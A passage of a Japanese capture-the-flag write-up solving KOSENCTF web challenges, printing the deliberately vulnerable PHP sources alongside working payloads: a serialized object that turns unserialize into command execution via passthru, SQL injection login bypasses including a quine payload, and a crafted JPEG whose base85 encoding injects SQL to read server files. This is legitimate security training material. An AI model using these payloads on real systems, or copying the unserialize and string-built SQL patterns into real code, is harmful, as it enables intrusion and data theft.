                    <div class="ms-alert ms-green">KOSENCTF{CIO_CHOCOLATEx2_CHOx3_IIYONE}</div>
...
```

フラグが得られました。

```
KOSENCTF{CIO_CHOCOLATEx2_CHOx3_IIYONE}
```

## [Web 200] Secure Session

> challenge (リンク)

与えられた URL にアクセスすると、以下のようなソースコードで動いているアプリケーションが表示されました。

`index.php`

```php
<?php
/**
 * A Sample Script For Secure Session Manager
 */
require_once(__DIR__ . '/modules/crypto.php');
require_once(__DIR__ . '/modules/session.php');
ini_set('display_errors', 1);
ini_set('session.use_strict_mode', 1);
ini_set('session.name', "KOSESSID");

/* Initialize */
if (isset($_POST['save'])) {
    // You can skip the bothering setup
    // by loading the saved handler.
    $handler = unserialize(base64_decode($_POST['save']));
} else {
    // Or, you can also setup the handler manually.
    $SECRET_KEY = 'sample-password'; // Keep it secret!
    $crypto = new SecureCrypto();
    $handler = new SecureSession($SECRET_KEY);
    $handler->set_crypto('encrypt', array($crypto, 'encrypt'));
    $handler->set_crypto('decrypt', array($crypto, 'decrypt'));
}
session_set_save_handler($handler, true);

/* Now you can start the secure session */
session_start();

/* Use the session as usual */
if (isset($_SESSION['count'])) {
    $_SESSION['count'] += 1;
} else {
    $_SESSION['count'] = 1;
}
?>
(略)
```

`modules/crypto.php`

```php
<?php
/**
 * Secure Cryptosystem
 */
class SecureCrypto
{
    /**
       Initialize this instance
     */
    public function __construct()
    {
    }

    /**
     * Encrypt with AES 256 CBC
     */
    public function encrypt($password, $data)
    {
        /*
	$iv_size = openssl_cipher_iv_length('AES-256-CBC');

	$key = hash('sha256', $password, TRUE);
	$iv  = openssl_random_pseudo_bytes($iv_size);
	
	$cipher = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $cipher);
    */
    return $data;
    }

    /**
     * Decrypt with AES 256 CBC
     */
    public function decrypt($password, $data)
    {
        /*
	$iv_size = openssl_cipher_iv_length('AES-256-CBC');

	$encrypted = base64_decode($data);
	$iv = substr($encrypted, 0, $iv_size);
	$cipher = substr($encrypted, $iv_size);
	
	$key = hash('sha256', $password, TRUE);
    return openssl_decrypt($cipher, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    */
    return $data;
    }
}
```

`modules/session.php`

```php
<?php
/**
 * Secure Session Manager
 */
class SecureSession extends SessionHandler
{
    private $crypto;
    private $key;
    
    /**
     * Initialize this instance
     */
    public function __construct($key)
    {
	// Set variables
	$this->key = $key;
	$this->crypto = array();
    }

    /**
     * Set a cryptosystem
     */
    public function set_crypto($crypto, $function)
    {
	$this->crypto[$crypto] = $function;
    }

    /**
     * Read and decrypt session data
     */
    public function read($id)
    {
	$data = parent::read($id);

	if (!$data) {
	    return "";
	} else {
	    return $this->crypto['decrypt']($this->key, $data);
	}
    }

    /**
     * Encrypt and write session data
     */
    public function write($id, $data)
    {
	$data = $this->crypto['encrypt']($this->key, $data);
	
	return parent::write($id, $data);
    }

    /**
     * Read the raw (encrypted) session data
     */
    public function read_raw($id)
    {
	parent::open(session_save_path(), $id);
	$data = parent::read($id);
	return $data;
    }
}
?>
```

`index.php` を眺めていると、以下の箇所でユーザ入力をそのまま `unserialize` に渡しており、ここで PHP Object Injection ができることがわかります。

```php
<?php
if (isset($_POST['save'])) {
    // You can skip the bothering setup
    // by loading the saved handler.
    $handler = unserialize(base64_decode($_POST['save']));
}
```

本来ここに入るのは `serialize` された `SecureSession` のインスタンスです。`modules/session.php` から `SecureSession` の定義を確認すると、以下のように少し危ない処理をしていることがわかります。

```php
<?php
    /**
     * Read and decrypt session data
     */
    public function read($id)
    {
      $data = parent::read($id);

      if (!$data) {
        return "";
      } else {
        return $this->crypto['decrypt']($this->key, $data);
      }
    }

    /**
     * Encrypt and write session data
     */
    public function write($id, $data)
    {
      $data = $this->crypto['encrypt']($this->key, $data);

      return parent::write($id, $data);
    }
```

PHP では `'func'()` と `func()` は等価です。したがって `$this->crypto['encrypt']` か `$this->crypto['decrypt']` に関数名、`$this->key` に引数を入れることで好きな関数を好きな引数で呼ぶことができそうです。これを行うオブジェクトを作って `serialize` した文字列を投げてみましょう。

```php
<?php
class SecureSession extends SessionHandler {
    private $crypto;
    private $key;
    
    public function __construct($key) {
        $this->key = $key;
        $this->crypto = array();
    }

    public function set_crypto($crypto, $function) {
        $this->crypto[$crypto] = $function;
    }
}

$handler = new SecureSession('ls');
$handler->set_crypto('encrypt', 'passthru');
$handler->set_crypto('decrypt', 'passthru');

echo base64_encode(serialize($handler));
```

```
>php payload.php
TzoxMzoiU2VjdXJlU2Vzc2lvbiI6Mjp7czoyMToiAFNlY3VyZVNlc3Npb24AY3J5cHRvIjthOjI6e3M6NzoiZW5jcnlwdCI7czo4OiJwYXNzdGhydSI7czo3OiJkZWNyeXB0IjtzOjg6InBhc3N0aHJ1Ijt9czoxODoiAFNlY3VyZVNlc3Npb24Aa2V5IjtzOjI6ImxzIjt9
```

これを投げると以下のようなファイルが存在していることがわかりました。

```
hOI_the_flag_is_here
index.php
modules
ssm.tar.gz
```

`hOI_the_flag_is_here` にアクセスするとフラグが得られました。

```
KOSENCTF{Th3_p01nt_1s_N0t_h0w_s3cur3_1t_1s_But_h0w_t0_us3_1t}
```

## [Web 250] Login

> challenge (リンク)
> 添付ファイル: login.tar.gz

`login.tar.gz` を展開すると、与えられた URL で動いているアプリケーションのソースコードが出てきました。

`var/www/init.php`

```php
<?php

$pdo = new PDO('sqlite:database.db');

$pdo->exec('create table users(username text unique not null, password text not null);');
$stmt = $pdo->prepare('insert into users(username, password) values(?, ?)');

$stmt->execute(['admin', bin2hex(random_bytes(2019))]);
```

`var/www/user.php`

```php
<?php

if (! isset($_SESSION['login'])) {
        die('<a href="index.php">PLEASE LOGIN PLEASE</a>');
}

if ($_SESSION['login'] === 'admin') {
       echo "<h3>HELLO ADMIN!</h3>"; 
       echo "<h3>".include('flag.php')."</h3>"; 
} else {
       echo "<h4>HELLO " . htmlspecialchars($_SESSION['login']) ."</h4>"; 
       echo "<p>Nice login, but you are not an admin!</p>";
       echo "<p><a href='logout.php'>Logout</a></p>";
}
```

`var/www/html/index.php`

```php
<?php

session_start();

$template = '';

if (isset($_SESSION['login'])) {
        $template = '../user.php';
} else {
        $template = '../index.html';
}

?>
(略)
```

`var/www/html/login.php`

```php
<?php

session_start();

if (isset($_POST['name']) && isset($_POST['password'])) {
        $username = $_POST['name'];
        $password = $_POST['password'];

        $pdo = new PDO("sqlite:../database.db");
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // dont' think to try time based sql injection!! 
        usleep(random_int(0, 5000000));
        try {
                $rows = $pdo->query("select username, password from users where username='$username' and password='$password'", PDO::FETCH_ASSOC)->fetchAll();
                if (count($rows) == 1 && md5($rows[0]['password']) === md5($password)) {
                        $_SESSION['login'] = $username;
                }
        } catch (Exception $e) {
                //
        }
}
header("Location: index.php");
```

`var/www/html/register.php`

```php
<?php

if (isset($_POST['name']) && isset($_POST['password'])) {
        $username = $_POST['name'];
        $password = $_POST['password'];

        $pdo = new PDO("sqlite:../database.db");
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        try {
                $stmt = $pdo->prepare('insert into users(username, password) values (?, ?)');
                $stmt->execute([$username, $password]);
        } catch (Exception $e) {
                //
        }
}

header("Location: index.php");
```

`var/www/html/login.php` の `$rows = $pdo->query("select username, password from users where username='$username' and password='$password'", PDO::FETCH_ASSOC)->fetchAll();` で SQL インジェクションができそうです。Blind SQL インジェクションで `admin` のパスワードを取得してもよさそうですが、4038 文字 (`var/www/init.php` 参照) と非常に長く現実的ではありません。

ここで、以下のようにすると `admin` としてログインすることができました。

1. `(適当なユーザ名)` / `' or username='(適当なユーザ名)` で登録 (プリペアドステートメントが使われているので、ここでは SQL インジェクションは発生しない)
2. `admin` / `' or username='(適当なユーザ名)` でログイン (ここで SQL インジェクションが発生して、`(適当なユーザ名)` のユーザ名とパスワードが返される)

```
KOSENCTF{I_DONT_HAVE_ANY_APTITUDE_FOR_MAKING_A_WEB_CHALLENGE_SORRY}
```

## [Web 50] Login Reloaded

> Solve Login first. This challenge has a stronger restriction than that of Login.
> challenge (リンク)
> 添付ファイル: login_reloaded.tar.gz

`login_reloaded.tar.gz` を展開すると、与えられた URL で動いているアプリケーションのソースコードが出てきました。内容は `Login` とほとんど同じものですが、`var/www/html/register.php` が削除され、また `var/www/html/login.php` が以下のように変更されています。

```php
<?php

session_start();

if (isset($_POST['name']) && isset($_POST['password']) && strlen($_POST['name']) < 128 && strlen($_POST['password']) < 128) {
        $username = $_POST['name'];
        $password = $_POST['password'];

        $pdo = new PDO("sqlite:../database.db");
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // Never try Time-Based Blind SQL Injection!!
        usleep(random_int(0, 5000000));
        try {
                $rows = $pdo->query("select username, password from users where username='$username' and password='$password'", PDO::FETCH_ASSOC)->fetchAll();
                if (count($rows) == 1 && md5($rows[0]['password']) === md5($password)) {
                        $_SESSION['login'] = $username;
                }
        } catch (Exception $e) {
                //
        }
}
header("Location: index.php");
```

ユーザ名とパスワードは 127 文字までしか入力できなくなっています。また、ユーザ登録ができなくなっているので `Login` の解法を使うことはできません。

ではどうするかというと、`union` を使って何か適当なユーザ名と、`$_POST['password']` をパスワードとして返すようなペイロードを書けばよさそうです。何を言っているのかよくわかりませんが、要は Quine になっているペイロードを書けばよさそうです。

`admin` / `'and 0 union select"admin",printf(s,s)from(select'''and 0 union select"admin",printf(s,s)from(select%Q s);--' s);--` でログインするとフラグが得られました。

```
KOSENCTF{FORGIVE_ME_FORGIVE_ME_FORGIVE_ME}
```

## [Web 350] Image Uploader

> challenge (リンク)
> 添付ファイル: image_uploader.tar.gz

`image_uploader.tar.gz` を展開すると、与えられた URL で動いているアプリケーションのソースコードが出てきました。

`index.php`

```php
<?php
require("base85.class.php");

if (isset($_GET['tag'])) {
    $search = true;
    $pdo = new PDO('mysql:host=localhost;dbname=uploader;charset=utf8', 'uploader', 'password',
		   array(PDO::ATTR_EMULATE_PREPARES => false));
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    try {
	// Get the image
	$stmt = $pdo->prepare('SELECT * FROM images WHERE tag=?');
	$stmt->execute([$_GET['tag']]);
	$result = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($result) {
	    $name = $result['username'];
	    $desc = $result['description'];
	    $image = base64_encode(base85::decode($result['image']));
        } else {
	    $image = NULL;
	}
    } catch (Exception $e) {
        //
	$image = NULL;
    }
}

if (isset($_POST['search'])) {
    if (is_uploaded_file($_FILES['image']['tmp_name'])) {
	// Check errors
	if ($_FILES['image']['error'] > 0) {
	    header("Location: /");
	    exit();
	}
	// Check the file type
	$tmp_name = $_FILES['image']['tmp_name'];
	$finfo = finfo_open(FILEINFO_MIME_TYPE);
	$mimetype = finfo_file($finfo, $tmp_name);
	if ($mimetype != "image/jpeg") {
	    header("Location: /");
	    exit();
	}
	// Search
	$search = true;
	$pdo = new PDO('mysql:host=localhost;dbname=uploader;charset=utf8', 'uploader', 'password',
		       array(PDO::ATTR_EMULATE_PREPARES => false));
	$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	try {
	    $binary = file_get_contents($_FILES['image']['tmp_name']);
	    $s_image = base85::encode($binary);
	    // Get the image
	    $row = $pdo->query("SELECT * FROM images WHERE image='{$s_image}'")->fetch(PDO::FETCH_ASSOC);
	    if ($row) {
		$name = $row['username'];
		$desc = $row['description'];
		$image = base64_encode(base85::decode($row['image']));
	    } else {
		$image = NULL;
	    }
	} catch (Exception $e) {
	    //
	    $image = NULL;
	}
    }
}
?>
(略)
```

`post.php`

```php
<?php
require("base85.class.php");

if (isset($_POST['name']) && isset($_POST['desc'])) {
    if (is_uploaded_file($_FILES['image']['tmp_name'])) {
	// Check errors
	if ($_FILES['image']['error'] > 0) {
	    header("Location: /post.php");
	    exit();
	}
	// Check the file type
	$tmp_name = $_FILES['image']['tmp_name'];
	$finfo = finfo_open(FILEINFO_MIME_TYPE);
	$mimetype = finfo_file($finfo, $tmp_name);
	if ($mimetype != "image/jpeg") {
	    header("Location: /post.php");
	    exit();
	}
	// Save
	$binary = file_get_contents($_FILES['image']['tmp_name']);
	$image = base85::encode($binary);
	$tag = hash("sha256", $image);
	$pdo = new PDO('mysql:host=localhost;dbname=uploader;charset=utf8', 'uploader', 'password',
		       array(PDO::ATTR_EMULATE_PREPARES => false));
	$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	try {
	    // Create a new record
	    $stmt = $pdo->prepare('INSERT INTO images(tag, username, description, image) VALUES(?, ?, ?, ?);');
	    $stmt->execute([$tag, $_POST['name'], $_POST['desc'], $image]);
	} catch(Exception $e) {
	    //
	}
    } else {
	header("Location: /post.php");
	exit();
    }
} 
?>
(略)
```

また、出力される HTML 中のメニューには `/admin.html` へのリンクがあり、与えられた URL からこれにアクセスすると以下のように WAF に阻まれました。

```html
<!-- mod_waf v0.1 -->
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>Web Application Firewall</title>
</head><body>
<h1>Web Application Firewall</h1>
<p>You are not authorized.</p>
</body></html>
```

さて、`index.php` には SQL インジェクションができる箇所があります。`$_POST['search']` が存在しているときに実行されるここです。

```php
<?php
	    $binary = file_get_contents($_FILES['image']['tmp_name']);
	    $s_image = base85::encode($binary);
	    // Get the image
	    $row = $pdo->query("SELECT * FROM images WHERE image='{$s_image}'")->fetch(PDO::FETCH_ASSOC);
```

アップロードしたファイルの内容が Base85 エンコードされたあと、そのまま SQL 文に挿入されています。ここに好きな文字列をぶちこめる JPEG を生成してくれるスクリプトを書いてみましょう。

```php
<?php
require("base85.class.php");
$payload = "\xff\xd8BB" . base85::decode("a'or(1);#");
var_dump(base85::encode($payload)); // check
file_put_contents('payload.jpg', $payload);
```

これを実行して出力された JPEG をアップロードすると、最初に投稿されたと思われる画像が表示されました。あとは普通に SQL インジェクションをすればよさそうです。

`union` と `file_load` 関数を使えば好きなファイルを読むことができます。これを利用して、先ほど `/admin.html` を見ようとしたときにブロックをした `mod_waf` の設定を見てみます。`/etc/apache2/mods-enabled/waf.load` は以下のような内容でした。

```
LoadModule waf_module /usr/lib/apache2/modules/mod_waf.so
```

`/usr/lib/apache2/modules/mod_waf.so` を読み込んでいるようです。`hex` 関数を使って hex エンコードした上で出力させるとこの共有ライブラリを得ることができました。`strings` でこのファイルが含む文字列を確認します。

```
>strings -tx mod_waf.so
...
    c8a /var/www/secret-pwd-file
...
```

気になるパスがあります。このファイルを読み込んでみると、以下のような内容であることがわかりました。

```
awkward_SQLi_2_bypass_WAF_module
```

これを `KOSENCTF{` と `}` で囲むとフラグが得られました。

```
KOSENCTF{awkward_SQLi_2_bypass_WAF_module}
```